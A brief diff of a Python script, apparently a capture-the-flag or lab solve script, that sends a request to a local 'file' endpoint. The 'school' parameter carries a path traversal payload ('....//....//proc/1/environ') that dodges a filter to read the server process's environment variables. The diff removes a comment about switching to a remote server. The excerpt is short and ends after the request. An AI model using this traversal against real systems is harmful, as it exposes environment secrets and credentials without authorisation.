@@ -1,7 +1,7 @@
 import requests
 import re
 
-URL = "http://localhost:5001/file?school=....//....//proc/1/environ" # Change to remote server
+URL = "http://localhost:5001/file?school=....//....//proc/1/environ"
 
 r = requests.get(URL)
 
